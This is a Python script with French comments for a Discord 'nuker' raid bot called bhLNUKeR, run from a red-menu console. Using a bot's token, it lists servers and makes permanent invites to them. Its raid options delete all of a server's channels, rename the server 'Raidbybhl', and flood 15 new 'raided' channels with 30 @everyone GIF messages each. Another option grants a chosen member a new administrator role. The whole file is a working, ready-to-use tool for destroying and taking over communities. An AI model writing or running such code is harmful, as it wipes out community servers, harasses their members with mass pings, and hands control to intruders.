import discord
import asyncio
import os
from colorama import Fore, Style, init

# Initialisation de colorama pour la couleur du texte
init(autoreset=True)

# Initialisation des intents
intents = discord.Intents.all()
client = discord.Client(intents=intents)

guilds_list = []  # Stocke les serveurs où le bot est présent

# Utiliser une chaîne brute pour éviter les erreurs de séquence d'échappement
ascii_art = r'''
 _     _     _     _   _ _   _ _  __    ____  
| |__ | |__ | |   | \ | | | | | |/ /___|  _ \ 
| '_ \| '_ \| |   |  \| | | | | ' // _ \ |_) |
| |_) | | | | |___| |\  | |_| | . \  __/  _ < 
|_.__/|_| |_|_____|_| \_|\___/|_|\_\___|_| \_\ 
'''


def afficher_interface():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + ascii_art)
    print(Fore.RED + """
Commandes disponibles :
1. Voir les serveurs où le bot est présent
2. Changer le nom d'un serveur
3. Troll
4. Supp
5. Créer un rôle administrateur pour un membre
""" + Style.RESET_ALL)

async def start_bot(token):
    @client.event
    async def on_ready():
        global guilds_list
        guilds_list = [(guild.name, guild.id) for guild in client.guilds]
        print(Fore.RED + f"Bot connecté en tant que {client.user}")
        print(Fore.RED + "Serveurs détectés :")
        for name, gid in guilds_list:
            print(Fore.RED + f"- {name} (ID: {gid})")

        # Une fois le bot prêt, afficher le menu
        await cmd_interface()  # Appel asynchrone de cmd_interface

    await client.start(token)

def demander_token():
    # Affiche l'ASCII art avant de demander le token
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + ascii_art)
    token = input(Fore.RED + "Entrez le token de votre bot : ")
    # Lancer le bot de manière asynchrone
    asyncio.run(start_bot(token))

async def cmd_interface():
    while True:
        afficher_interface()
        try:
            choix = input(Fore.RED + "\nEntrez le numéro de la commande : ")

            if choix == '1':
                os.system('cls' if os.name == 'nt' else 'clear')
                print(Fore.RED + "Serveurs où le bot est présent :")
                if guilds_list:
                    for name, gid in guilds_list:
                        print(Fore.RED + f"- {name} (ID: {gid})")
                    sous_choix = input(Fore.RED + "\nTapez 1 pour générer un lien d'invitation ou 2 pour revenir au menu : ")
                    if sous_choix == '1':
                        serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur : "))

                        async def generer_invite():
                            guild = discord.utils.get(client.guilds, id=serveur_id)
                            if guild and guild.text_channels:
                                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
                                print(Fore.RED + f"Lien d'invitation : {invite.url}")
                            else:
                                print(Fore.RED + "Serveur ou salon non trouvé.")

                        await generer_invite()
                        input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")

                else:
                    print(Fore.RED + "Aucun serveur détecté. Assurez-vous que le bot est connecté.")
                    input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")

            elif choix == '2':
                serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur : "))
                nouveau_nom = input(Fore.RED + "Entrez le nouveau nom du serveur : ")

                async def changer_nom():
                    guild = discord.utils.get(client.guilds, id=serveur_id)
                    if guild:
                        await guild.edit(name=nouveau_nom)
                        print(Fore.RED + f"Nom du serveur changé en : {nouveau_nom}")
                    else:
                        print(Fore.RED + "Serveur non trouvé.")

                await changer_nom()
                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")

            elif choix == '3':
                serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur : "))

                async def funny():
                    guild = discord.utils.get(client.guilds, id=serveur_id)
                    if guild:
                        tasks = []  # Liste des tâches pour exécuter en parallèle

                        # Suppression des salons existants
                        for channel in guild.channels:
                            # Vérification si le salon est requis pour un serveur communautaire
                            if isinstance(channel, discord.TextChannel) and channel.name == "community" and channel.category is not None:
                                print(Fore.RED + f"Le salon '{channel.name}' est requis pour le serveur communautaire et ne sera pas supprimé.")
                                continue  # Ignore ce salon et passe au suivant
                            try:
                                tasks.append(channel.delete())  # Ajout de la tâche de suppression
                                print(Fore.RED + f"Salon {channel.name} supprimé.")
                            except discord.errors.Forbidden:
                                print(Fore.RED + f"Impossible de supprimer le salon {channel.name}, permission insuffisante.")
                            except discord.errors.HTTPException as e:
                                print(Fore.RED + f"Erreur lors de la suppression du salon {channel.name}: {e}")

                        # Attente de la fin de toutes les suppressions
                        await asyncio.gather(*tasks)

                        tasks.clear()  # Vider la liste des tâches avant de recréer les salons

                        # Création de 15 salons
                        for i in range(15):
                            salon = await guild.create_text_channel("raided")
                            print(Fore.RED + f"Salon '{salon.name}' créé.")

                            # Envoie du message avec le lien du GIF 5 fois dans le salon
                            for _ in range(30):
                                tasks.append(salon.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif"))
                                print(Fore.RED + f"@everyone mentionné dans '{salon.name}'.")

                        # Attente de l'envoi de tous les messages
                        await asyncio.gather(*tasks)

                    else:
                        print(Fore.RED + "Serveur non trouvé.")

                await funny()
                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")

            elif choix == '4':
                serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur pour supprimer tous les salons : "))

                async def supprimer_tous_les_salons_et_creer_nuked():
                    guild = discord.utils.get(client.guilds, id=serveur_id)
                    if guild:
                        for channel in guild.channels:
                            try:
                                await channel.delete()
                                print(Fore.RED + f"Salon {channel.name} supprimé.")
                            except discord.errors.Forbidden:
                                print(Fore.RED + f"Impossible de supprimer le salon {channel.name}, permission insuffisante.")
                            except discord.errors.HTTPException as e:
                                print(Fore.RED + f"Erreur lors de la suppression du salon {channel.name}: {e}")

                        print(Fore.RED + "Tous les salons ont été supprimés.")

                        # Changer le nom du serveur en "NUKE"
                        await guild.edit(name="Raidbybhl")
                        print(Fore.RED + "Nom du serveur changé en : Raidbybhl")

                        # Création du salon 'nuked'
                        nuked_channel = await guild.create_text_channel("Raidbybhl")
                        print(Fore.RED + f"Salon 'Raidbybhl' créé.")
                        # Envoi du message avec le lien du GIF
                        await nuked_channel.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif")
                        print(Fore.RED + f"Message avec le lien du GIF envoyé dans le salon 'nuked'.")
                    else:
                        print(Fore.RED + "Serveur non trouvé.")

                await supprimer_tous_les_salons_et_creer_nuked()
                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")

            elif choix == '5':
                serveur_id = int(input(Fore.RED + "Entrez l'ID du serveur : "))
                membre_id = int(input(Fore.RED + "Entrez l'ID du membre : "))

                async def creer_et_attribuer_role():
                    guild = discord.utils.get(client.guilds, id=serveur_id)
                    if guild:
                        # Créer le rôle avec des permissions administrateur
                        permissions = discord.Permissions(administrator=True)
                        role = await guild.create_role(name="BHL", permissions=permissions)
                        print(Fore.RED + "Rôle 'BHL' créé avec des permissions administrateur.")

                        # Attribuer le rôle au membre
                        membre = discord.utils.get(guild.members, id=membre_id)
                        if membre:
                            await membre.add_roles(role)
                            print(Fore.RED + f"Le rôle 'BHL' a été attribué à {membre.name}.")
                        else:
                            print(Fore.RED + "Membre non trouvé.")
                    else:
                        print(Fore.RED + "Serveur non trouvé.")

                await creer_et_attribuer_role()  # Utilisation de 'await' ici
                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")

            else:
                print(Fore.RED + "Commande invalide. Veuillez réessayer.")
                input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")
        except Exception as e:
            print(Fore.RED + f"Erreur : {e}")
            input(Fore.RED + "\nAppuyez sur Entrée pour revenir au menu...")

if __name__ == "__main__":
    demander_token()
